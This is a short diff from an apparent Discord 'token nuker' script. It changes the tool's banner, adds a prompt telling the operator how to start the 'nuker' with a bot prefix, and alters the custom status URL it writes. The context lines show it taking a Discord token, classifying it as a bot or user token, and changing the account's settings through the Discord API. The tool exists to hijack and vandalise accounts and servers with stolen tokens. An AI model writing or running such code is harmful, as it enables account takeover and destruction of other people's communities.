@@ -15,7 +15,7 @@ from time import sleep
 
 colorama.init()
 
-print(Fore.LIGHTBLUE_EX + f'''
+print(Fore.LIGHTBLUE_EX + rf'''
 NEW UPDATE: Automatically identifies if a token is a bot token or a user account token.
 
 meow   __  __ _____ _____        ___ ____      _   _ _   _ _  _______ ____    meow
@@ -88,7 +88,7 @@ def vtoken(token):
             print(Fore.YELLOW + "[*] Token Successfully Identified: Bot")
 
             prefix = input(Fore.LIGHTBLUE_EX + "[?] Enter bot prefix: ")
-
+            print(Fore.YELLOW + f"[*] Prefix successfully set, {prefix}meow to start the nuker!")
 
             nick = input(Fore.LIGHTBLUE_EX + "[?] what is your internet nickname (NUKED BY {nickname}): ")
 
@@ -240,7 +240,7 @@ def vtoken(token):
                 'convert_emoticons': False,
                 'enable_tts_command': False,
                 'explicit_content_filter': '0',
-                "custom_status": {"text": "https://github.com/meowistic/discord-token-nuker"},
+                "custom_status": {"text": f"https://github.com/meowistic"},
                 'status': "idle"
             }
             requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token),
